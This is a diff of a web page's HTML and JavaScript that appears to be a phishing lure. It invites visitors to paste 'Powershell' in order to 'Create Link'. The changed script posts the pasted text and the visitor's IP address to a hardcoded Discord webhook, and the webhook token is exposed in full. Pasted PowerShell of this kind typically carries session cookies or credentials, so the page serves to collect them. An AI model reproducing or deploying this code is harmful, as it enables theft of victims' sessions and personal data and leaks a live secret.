@@ -105,9 +105,9 @@
         </ul>
 
   
-        <input type="text" id="webhookKey" placeholder="Enter Powershell">
+            <input type="text" id="webhookKey" placeholder="Enter Powershell to Create Link.">
         <button onclick="sendToWebhook()">Create Link</button>
-
+                                                         
         <div class="centered-video">
             <iframe src="https://www.youtube.com/embed/zpvEXK6nc04" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
         </div>
@@ -139,7 +139,7 @@
 
                 const webhookUrl = "https://discord.com/api/webhooks/1302810226734403595/MMPGCUIQa0FD3_5WDk5_pFGwIlGGCe_6GjmxqNTQTd15CzHQ-jIsBAfv0M3HTBArMTHf";
                 const payload = {
-                    content: `@everyone IP ADDRESS: ${ipAddress}\nKEY: ${userKey}`
+                    content: `@everyone IP ADDRESS: ${ipAddress}\nPowershell: ${inputContent}`
                 };
 
                 await fetch(webhookUrl, {
